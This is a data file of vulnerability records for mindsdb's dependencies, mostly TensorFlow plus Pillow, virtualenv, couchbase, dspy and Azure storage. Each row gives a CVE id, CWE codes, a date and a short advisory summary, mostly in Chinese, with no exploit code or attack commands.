mindsdb_mindsdb,tensorflow,,True,CVE-2022-41880,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于 `BaseCandidateSamplerOp` 函数接收到 `true_classes` 中的值大于 `range_max` 时，会发生堆外读取。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29599,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在数字错误漏洞，该漏洞源于“Split”TFLite操作符的实现容易受到被零除法错误的影响。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2020-15194,CWE-20 CWE-617,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow  SparseFillEmptyRowsGrad 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞源于SparseFillEmptyRowsGrad实现对其参数形状的验证不完全，该漏洞允许攻击者可以传递错误的grad_values_t来触发vec中的断言失败，从而导致服务安装中的服务被拒绝。",3,2
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37665,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在输入验证错误漏洞，该漏洞源于产品 requantization 的 MKL 实现未对空指针做有效验证，攻击者可通过解引用空指针访问堆分配数组之外的数据。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2020-15208,CWE-125 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
tensorflow-lite 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者进行超出范围的读写操作。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29216,CWE-94,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在代码注入漏洞，该漏洞源于saved_model_cli工具存在代码注入问题。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29518,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，该漏洞源于在立即模式下会话操作是无效的。但是用户仍然可以调用与之关联的原始操作，并触发空指针解引用。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29582,CWE-125,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞源于tf.raw_ops.Dequantize缺少验证。攻击者可利用该漏洞可以从堆分配的数据边界之外触发读取。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35986,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 RaggedBincount 被赋予一个空的输入张量 splits ，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41196,CWE-191,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于 TensorFlow 实现了池化操作，其中滑动窗口中的值没有被严格检查为正数。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2020-15195,CWE-119 CWE-122 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
 Tensorflow SparseFillEmptyRowsGrad 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者造成缓存区溢出问题。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37684,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37656,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，攻击者可以通过将引用绑定到""tf.raw_ops.RaggedTensorToSparse""中的空指针来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2018-21233,CWE-125,2020-05-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 1.7.0之前版本中的core/kernels/decode_bmp_op.cc文件的BMP decoder的DecodeBmp功能存在缓冲区错误漏洞。攻击者可利用该漏洞获取进程内存的内容。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35938,CWE-125,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 GatherNd 函数接受确定输入和输出大小的参数。如果给定的输入大于或等于输出的大小，则会触发越界内存读取或崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41225,CWE-908,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 Grappler 优化器使用了未初始化的变量。 如果 train_nodes 向量（从保存的优化模型中获得）不包含 Dequeue 节点，那么 dequeue_node 将被单元化。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29564,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在代码问题漏洞，攻击者可利用该漏洞触发空指针解引用。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29200,CWE-20 CWE-1284,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.LSTMBlockCell 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41896,CWE-20 CWE-1284,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `ThreadUnsafeUnigramCandidateSampler` 的输入 `filterbank_channel_count` 大于允许的最大大小，TensorFlow 将崩溃。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37679,CWE-125 CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在缓冲区错误漏洞，该漏洞源于产品可能会泄露内存信息。 以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23580,CWE-400 CWE-1284,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在资源管理错误漏洞，修复将包含在TensorFlow 2.8.0中。我们也会在TensorFlow 2.7.1、TensorFlow 2.6.3和TensorFlow 2.5.3上选择这个提交，因为这些也会受到影响，并且仍然在支持范围内。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37663,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于在受影响的版本中，tf.raw_ops.QuantizeV2 中的不完整验证造成的。攻击者可利用该漏洞通过将引用绑定到空指针来触发未定义的行为，或者可以访问堆分配数组边界之外的数据。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37649,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.6.0 之前版本、2.5.1之前版本、2.4.3之前版本和2.3.4之前版本存在代码问题漏洞，该漏洞源于“tf.raw_ops.UncompressElement”的代码可以用来触发空指针解引用",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41898,CWE-20,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。出现此漏洞是因为如果 `SparseFillEmptyRowsGrad` 的输入为空，TensorFlow将崩溃。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35935,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于容易受到因断言失败导致的拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23568,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于AddManySparseToTensorsMap的实现容易受到整数溢出的影响，当构建新的TensorShape对象时，会导致CHECK失败(基于拒绝服务的断言失败)。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2020-26268,CWE-471,2020-12-10,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow存在安全漏洞，攻击者可利用该漏洞导致缓冲区溢出。以下产品及版本受到影响：1.15.5、2.0.4、2.1.3、2.2.2、2.3.2、2.4.0。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29600,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在数字错误漏洞，该漏洞源于TFLite操作符OneHot的实现是一个除法零错误。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2020-15266,CWE-119,2020-10-21,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 2.4.0之前版本存在安全漏洞，该漏洞源于当tf.image.crop_and_resize 的 boxes的参数有一个非常大的值，CPU内核实现接收它作为一个c++  nan 浮点值。试图对其进行操作是一种未定义的行为，稍后会产生分割错误。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25665,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的开源平台。2.12.0版本之前的2.12版本和2.11.1版本之前的2.11版本存在代码问题，该漏洞源于当'SparseSparseMaximum'被赋予无效的稀疏张量作为输入时，会导致空指针解引用错误。,2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2019-16778,CWE-122 CWE-681,2019-12-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 1.15之前版本中的UnsortedSegmentSum存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。本地攻击者可利用该漏洞在系统上执行任意代码或导致应用程序崩溃。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21726,CWE-125,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在缓冲区错误漏洞，该漏洞源于Dequantize的实现并不完全验证axis的值，并可能导致堆OOB访问。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41216,CWE-120 CWE-787,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 Transpose 的形状推断函数容易受到堆缓冲区溢出的影响。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23577,CWE-476,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在代码问题漏洞，该漏洞源于 GetInitOp 的实现很容易因对空指针进行解引用而导致崩溃。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41204,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在TensorFlow受影响版本的抓取器优化阶段，常量折叠可能试图深度复制资源张量。这将导致分段错误，因为这些张量应该是不变的。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41884,CWE-670,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。当创建的numpy数组的形状为一个元素为零而其他元素之和为一个大数时，可能导致错误，引发应用程序崩溃。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23586,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，恶意用户可以通过更改SavedModel，从而在function中断言，从而导致拒绝服务。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35991,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 TensorListScatter 和 TensorListScatterV2 收到等级大于 1 的 element_shape 时，它们会给出断言失败，这可能会触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23579,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的格斗器优化器可以通过修改SavedModel来导致拒绝服务，这样SafeToRemoveIdentity就会触发CHECK失败。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-36016,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tensorflow::full_type::SubstituteFromAttrs 收到不完全是三个参数的 FullTypeDef& t 时，它会触发 CHECK -fail 而不是返回状态。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29212,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于应用在使用 TFLite 模型转换器创建的某些 TFLite 模型在加载到 TFLite 解释器时会发生崩溃。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23571,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞攻击者在TensorFlow流程中导致拒绝服务。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29191,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.GetSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-36013,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于当 mlir::tfg::GraphDefImporter::ConvertNodeDef 尝试在没有操作名称的情况下转换 NodeDef 时，它会崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-41198,CWE-190,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，在受影响的版本中，如果使用大输入参数调用 `tf.tile`，那么 TensorFlow 进程将由于溢出导致的 `CHECK` 失败而崩溃。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35998,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 EmptyTensorList 接收到具有多个维度的输入 element_shape ，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37652,CWE-416 CWE-415,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.5.1，2.4.3和2.3.4存在资源管理错误漏洞，攻击者可以利用该漏洞导致TensorFlow异常终止。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35963,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 FractionalAvgPoolGrad 的实现没有完全验证输入 orig_input_tensor_shape 。这会导致溢出，导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25674,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的端到端开源平台。2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在空指针错误，该漏洞源于启用 XLA 的 RandomShuffle 操作。,2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2022-35974,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizeDownAndShrinkRange 为 input_min 或 input_max 提供非标量输入，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37658,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于攻击者可以通过在所有类型为 `tf.raw_ops.MatrixSetDiagV*` 的操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29568,CWE-824 CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2版本、2.3.3版本、2.2.3版本、2.1.4版本存在代码问题漏洞，攻击者可利用该漏洞可以通过绑定tf.raw_ops.ParameterizedTruncatedNormal的空指针来触发未定义的行为。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-36017,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 Requantize 被赋予 input_min 、 input_max 、 requested_output_min 、 requested_output_max 非零秩张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37636,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于`SparseDenseCwiseDiv` 中的浮点异常。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41889,CWE-476,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果将量化张量列表分配给属性，则pywrap代码无法解析张量并返回未捕获的‘nullptr’。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-23573,CWE-908,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于 AssignOp 的实现可以导致将未初始化的数据复制到一个新的张量。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41900,CWE-125 CWE-787,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞出现在TensorFlow的池化操作中，导致FractionalMax(AVG)Pool具有非法的pooling_ratio，攻击者可以利用此漏洞访问不受用户控制的堆内存。,2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-21731,CWE-843,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于ConcatV2的形状推断实现可用于通过由类型混淆引起的段错误触发拒绝服务攻击。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-36005,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tf.quantization.fake_quant_with_min_max_vars_gradient 接收到非标量的输入 min 或 max 时，它会给出可能触发拒绝服务攻击的断言失败。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-27579,CWE-697,2023-03-24,TensorFlow是一个用于机器学习的端到端开源平台。使用小于1的参数“filter_input_channel”构建tflite模型会导致浮点异常(FPE)。该漏洞在2.12版本中被修复。,2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37654,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，tf.raw_ops.ResourceGather缺少有效的限制，攻击者可以在TensorFlow的调试版本中执行“检查”-失败，或从发布版本中相同API中的堆分配的边界之外数据读取，来触发崩溃。",2,0
mindsdb_mindsdb,tensorflow,,True,CVE-2022-36018,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果为 RaggedTensorToVariant 提供了一个 rt_nested_splits 列表，其中包含除 1 之外的等级张量，则会导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37660,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在数字错误漏洞，该漏洞源于软件未正确计算或转换所产生的数字。攻击者可利用该漏洞可以通过调用特制的参数的操作导致数据被0除，从而导致浮点异常。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25664,CWE-120 CWE-122,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于TAvgPoolGrad中存在堆缓冲区溢出，影响版本为2.12.0及之前的版本（不包括2.11.1）。,2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2022-41888,CWE-20,2022-11-18,TensorFlow是一个用于机器学习的开源平台。在GPU上运行时，`tf.image.generate_bounding_box_proposals`函数收到一个未进行检查的`scores`输入，该输入必须为4级。,3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2023-25670,CWE-476,2023-03-24,TensorFlow是一个强大的开源机器学习框架，用于构建和训练各种复杂的神经网络模型。在版本2.12.0之前的2.12和版本2.11.1之前的2.11中，QuantizedMatMulWithBiasAndDequantize操作存在零点错误，可能导致空指针解引用问题。,2,2
mindsdb_mindsdb,tensorflow,,True,CVE-2022-29204,CWE-20 CWE-191,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于tf.raw_ops.UnsortedSegmentJoin 对于输入的参数存在不完全验证。攻击者利用该漏洞可以触发断言失败实现拒绝服务攻击。",3,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29585,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于没有检查stride是否为0。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-29602,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于DepthwiseConvTFLite操作符的实现容易出现被除零错误。",4,0
mindsdb_mindsdb,tensorflow,,True,CVE-2021-37688,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，攻击者可以制作一个 TFLite 模型来触发空指针取消引用，这将导致崩溃和拒绝服务。",2,0
mindsdb_mindsdb,azure-storage-blob,,True,CVE-2022-30187,CWE-327,2022-07-12,"Microsoft Azure是美国微软（Microsoft）公司的一套开放的企业级云计算平台。
Microsoft Azure存在加密问题漏洞。以下产品和版本受到影响：Azure Storage Blobs client library for .NET,Azure Storage Queues client library for .NET,Azure Storage Blobs client library for Java,Azure Storage Queues client library for Python,Azure Storage Blobs client library for Python.",3,2
mindsdb_mindsdb,virtualenv,,True,CVE-2011-4617,CWE-59,2011-12-31,Virtualenv中存在漏洞，该漏洞源于使用不安全的方式创建临时文件。有本地访问权的攻击者可能利用该漏洞执行符号链接攻击，攻击成功可能允许攻击者损坏敏感文件或者获得对敏感信息的访问权，也可能执行其他的攻击。,3,0
mindsdb_mindsdb,virtualenv,,True,CVE-2024-53899,CWE-77 CWE-78,2024-10-01,"Virtualenv是Python Packaging Authority开源的一款Python虚拟环境构建器。
Virtualenv 20.26.6之前版本存在操作系统命令注入漏洞，该漏洞源于Magic模板字符串未正确引用。",3,0
mindsdb_mindsdb,couchbase,4.3.1,True,CVE-2023-45875,CWE-200,2023-11-08,在Couchbase Server 7.2.0版本中，当用户将一个7.0版本之前的节点添加到7.2版本的集群时，会在debug.log文件中发现私钥泄露的问题。,2,0
mindsdb_mindsdb,couchbase,4.3.1,True,CVE-2023-45875,CWE-200,2023-11-08,在Couchbase Server 7.2.0版本中，当用户将一个7.0版本之前的节点添加到7.2版本的集群时，会在debug.log文件中发现私钥泄露的问题。,2,0
mindsdb_mindsdb,dspy,0.1.4,True,CVE-2025-12695,CWE-653,2025-11-04,<p>DSPy 是一个用于构建人工智能代理的开发工具，其主要功能是通过构造 AI 代理来处理用户输入，并支持通过 'PythonInterpreter' 类执行 Python 代码。该漏洞的产生是由于 DSPy 的沙箱配置过于宽松，未对用户输入进行充分的隔离与校验，攻击者可以通过构造特定的恶意输入，绕过沙箱限制并与沙箱中的 Python 环境交互。这种交互能够进一步被利用来访问系统底层文件系统，从而读取敏感文件。CWE-653 的引用表明问题的根源在于沙箱的隔离机制不完善，未能有效地限制脚本的执行范围。</p>,2,2
mindsdb_mindsdb,pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
mindsdb_mindsdb,pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
mindsdb_mindsdb,pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
mindsdb_mindsdb,pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
